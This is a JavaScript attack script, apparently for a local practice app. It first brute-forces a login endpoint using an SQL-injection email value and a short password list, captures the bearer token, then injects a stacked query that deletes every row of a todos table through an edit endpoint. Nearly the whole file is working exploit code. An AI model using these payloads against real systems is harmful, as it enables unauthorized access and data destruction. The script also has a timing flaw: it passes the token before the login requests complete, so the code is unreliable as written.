// step 1

// script brute force pakai javascript!

let tokenStealth;

const email = `' OR 1 = 1; -- '`;  // bypass email
const trials = ['admin', 'user', 'cook', 'furry', '123', '1234'];

for (let pass of trials)
{
(async function(email, pass) {
const response = await fetch("http://localhost/login", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,id;q=0.8",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundary0TwUMXk9SWzvvWwn",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "http://localhost/login.html",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": `------WebKitFormBoundary0TwUMXk9SWzvvWwn\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n${email}\r\n------WebKitFormBoundary0TwUMXk9SWzvvWwn\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n${pass}\r\n------WebKitFormBoundary0TwUMXk9SWzvvWwn--\r\n`,
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});

return response.status == 200 ? await response.json() : null;
})(email, pass).then((e) => {

console.log(e);
tokenStealth = e.data.token;
})
}

// step 2

// inject mysql query!
(async function(token) {

const query = 'DELETE FROM `todos` WHERE 1 = 1';

const data = {
    "description": `' WHERE 1 = 0; ${query};  --`,
    "deadline": 1701772895425,
    "finished": false
}

const response = await fetch("http://localhost/admin/todos/edit?id=1", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,id;q=0.8",
    "content-type": "application/json",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Microsoft Edge\";v=\"120\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "authorization": "Bearer " + token
  },
  "referrer": "http://localhost/login.html",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify(data),
  "method": "PUT",
  "mode": "cors",
  "credentials": "omit"
});

return response.status == 200 ? await response.json() : null;
})(tokenStealth).then((e) => {

console.log(e);
})